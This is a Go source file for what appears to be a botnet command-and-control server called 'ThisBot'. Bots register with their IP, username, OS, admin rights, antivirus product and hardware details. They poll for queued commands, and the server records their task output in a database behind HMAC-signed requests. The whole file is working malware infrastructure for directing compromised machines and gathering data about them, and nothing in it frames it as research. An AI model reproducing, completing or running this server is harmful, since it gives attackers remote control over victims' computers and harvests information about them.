package main

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"crypto/hmac"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/go-chi/chi/middleware"
	"github.com/go-chi/chi/v5"
)

func task_cleaner(db *sql.DB, interval time.Duration) {
	go func() {
		time.Sleep(time.Duration(interval) * time.Second)
		_, err := db1.Exec(db, `delete from tasks where status in ('done', 'failed', 'canceled') and completed_at < UTC_TIMESTAMP() - INTERVAL 3 DAY`)
		if err != nil {
			log.Println("Task cleanup error: " + err.Error())
		}
	}()
}

func http_sender(w http.ResponseWriter, guid, token string, reply *common.ServerReply) error {
	server_time := utils.GenerateUtcTimestampString()

	// Setup http reply's header
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Guid", guid)
	w.Header().Set("X-Time", server_time)
	bytToken, _ := common.Base64Dec(token)
	hmac := common.HmacSha256(bytToken, []byte(guid+server_time))
	w.Header().Set("X-Sign", common.Base64Enc(hmac))
	// Setup http reply's body
	body, _ := json.Marshal(reply)
	// Send http reply
	_, err := w.Write(body)

	return err
}

func recovery_handler(w http.ResponseWriter, r *http.Request) {
	log.Println("recovery_handler triggered")

	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")
	// Read bot info
	var bot common.Client
	utils.ReadJson(r, &bot)

	reply := common.ServerReply{
		Args: make(map[string]any),
	}

	reply.Status = 1
	reply.TaskId = 0
	reply.Error = ""
	reply.Cmd = ""

	out_guid := ""
	out_token := ""
	strSql := "select guid, token from clients where guid=?"
	err := db1.QueryRow(common.Db, strSql, guid).Scan(&out_guid, &out_token)
	if err == sql.ErrNoRows {
		// No such bot, create bot
		strSql = "insert into clients (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) values(?,?,?,?,?,?,?,?,?,?,?,?)"
		// Generate new token
		out_token = common.Base64Enc(utils.GenerateRandomBytes(32))
		_, err = db1.Insert(common.Db, strSql, guid, out_token, bot.Ip, bot.Whoami, bot.Os, bot.Installdate, bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, time1)
		if err != nil {
			// Failed to create a bot
			reply.Status = 0
			reply.Error = "No such bot and failed to create new bot"
		} else {
			// Create bot okay
			reply.Args["Token"] = out_token
		}
	} else if err != nil {
		reply.Status = 0
		reply.Error = "Unknown error"
		log.Println(err.Error())
	} else {
		// Find the bot
		reply.Args["Token"] = out_token
		// Update timestamp lastseen
		strSql = "update clients set lastseen=? where guid=?"
		_, err = db1.Exec(common.Db, strSql, time1, out_guid)
		if err != nil {
			reply.Status = 0
			reply.Error = "Find the bot but failed to update"
			log.Println(err.Error())
		}
	}

	err = http_sender(w, guid, out_token, &reply)
	if err != nil {
		log.Println(err.Error())
	}
}

func check_package_legality(guid string, token string, x_sign string, x_time string) bool {
	// Check overtime
	current_time := utils.GenerateUtcTimestamp()
	sent_time, _ := strconv.ParseInt(x_time, 10, 64)
	if current_time-sent_time >= 60*1000 {
		log.Printf("package overtime")
		return false
	}
	// Check sign
	bytesToken, _ := common.Base64Dec(token)
	sign := common.HmacSha256(bytesToken, []byte(guid+x_time))
	bytesSign, _ := common.Base64Dec(x_sign)

	return hmac.Equal(sign, bytesSign)
}

func poll_handler(w http.ResponseWriter, r *http.Request) {
	log.Println("poll_handler triggered")
	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")
	sign := r.Header.Get("X-Sign")

	// Find bot in clients
	var saved_guid string
	var saved_token string
	var saved_lastseen string
	var saved_botid int
	reply := common.ServerReply{
		Args: make(map[string]any),
	}

	reply.Cmd = ""
	reply.Error = ""
	reply.Status = 1
	reply.TaskId = 0

	sqlStr := "select id, guid, token, lastseen from clients where guid=?"
	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_botid, &saved_guid, &saved_token, &saved_lastseen)
	if err == sql.ErrNoRows {
		// Can't find bot
		log.Println("can't find bot in poll handler" + err.Error())
		reply.Cmd = "register"
		reply.Status = 0
		reply.Error = "can't find bot in poll handler"
	} else if err != nil {
		log.Println(err.Error())
		reply.Status = 0
		reply.Error = "Unknown error"
		reply.Cmd = "register"
	} else {
		// Find it!
		if !check_package_legality(guid, saved_token, sign, time1) {
			reply.Status = 0
			reply.Error = "Illegal package"
			reply.Cmd = "poll"
		} else {
			sqlStr = "select t.id as task_id, c.name, t.args" +
				" from tasks t join commands c on t.command_id = c.id" +
				" where t.bot_id = ? and t.status = 'queued' order by t.created_at asc limit 1"
			saved_id := 0
			saved_command := ""
			var saved_args map[string]any
			var bytes_args []byte
			err = db1.QueryRow(common.Db, sqlStr, saved_botid).Scan(&saved_id, &saved_command, &bytes_args)
			if err == sql.ErrNoRows {
				// No such task
				reply.Cmd = "poll"
				reply.Status = 0
				reply.Error = "Can't find task"
			} else if err != nil {
				// Error in finding task
				reply.Status = 0
				reply.Error = "Unknown error"
				reply.Cmd = "register"
			} else {
				json.Unmarshal(bytes_args, &saved_args)
				// Update the status of task to running
				sqlStr = "update tasks set status='running' where id=?"
				_, err := db1.Exec(common.Db, sqlStr, saved_id)
				if err != nil {
					reply.Cmd = "poll"
					reply.Error = "Can't update task status"
					reply.TaskId = int64(saved_id)
					fmt.Println("[-] Failed to update status when execute task id = " + strconv.FormatInt(int64(saved_id), 10))
				} else {
					// Find the command of task and send to bot
					reply.Cmd = saved_command
					reply.Args = saved_args
					reply.TaskId = int64(saved_id)
				}
			}
		}
	}
	err = http_sender(w, guid, saved_token, &reply)
	if err != nil {
		log.Println(err.Error())
	}
}

func logout_handler(w http.ResponseWriter, r *http.Request) {

}

func login_handler(w http.ResponseWriter, r *http.Request) {

}

func report_handler(w http.ResponseWriter, r *http.Request) {
	log.Println("report_handler triggered")

	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")
	sign := r.Header.Get("X-Sign")

	// Check if the bot exists
	saved_token := ""
	saved_id := 0
	saved_ip := ""
	sqlStr := "select id, token, ip from clients where guid=?"
	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_id, &saved_token, &saved_ip)
	if err == sql.ErrNoRows {
		fmt.Println("[-] Can't find bot in report hander")
		return
	} else if err != nil {
		fmt.Println("[-] Unknown error")
		return
	}
	// Check legality of the package
	if !check_package_legality(guid, saved_token, sign, time1) {
		fmt.Println("[-] Illegal package")
		return
	}

	// Parse the report
	var report common.Report
	err = json.NewDecoder(r.Body).Decode(&report)
	if err != nil {
		fmt.Println("[-] Failed to read the report")
		return
	}
	defer r.Body.Close()
	// Find the task and update it's status
	status := "done"
	if !report.Success {
		status = "failed"
	}
	int64_time, _ := strconv.ParseInt(time1, 10, 64)
	t := time.UnixMilli(int64_time)

	sqlStr = "update tasks set status='" + status + "',completed_at='" + t.Format("2006-01-02 15:04:05") + "' where id=?"
	_, err = db1.Exec(common.Db, sqlStr, report.TaskID)
	if err != nil {
		log.Printf("[-] Failed to update task[%s] status\n", report.TaskID)
		return
	}

	// Add log to database
	action := report.Extra["action"].(string)
	sqlStr = "insert into logs(account_id, action, client_id, message, status, ip, task_id) values(?,?,?,?,?,?,?)"
	saved_task_id_int, _ := strconv.ParseInt(report.TaskID, 10, 64)
	_, err = db1.Insert(common.Db, sqlStr, common.Account, action, saved_id, report.Output, report.Error, saved_ip, saved_task_id_int)
	if err != nil {
		log.Printf("[-] Failed to add task[%s] log\n", report.TaskID)
		return
	}
	fmt.Println("[+] New task log generated")
}

func Server() {
	router := chi.NewRouter()

	// router.Use(middleware.Logger)
	router.Use(middleware.Recoverer)

	router.Post("/recovery", recovery_handler)
	router.Post("/poll", poll_handler)
	router.Post("/login", login_handler)
	router.Post("/logout", logout_handler)
	router.Post("/report", report_handler)

	strPort := strconv.Itoa(common.Cfg.Server.Port)
	log.Println("[+] Server running on " + common.Cfg.Server.Host + ":" + strPort)

	http.ListenAndServe(":"+strPort, router)
}
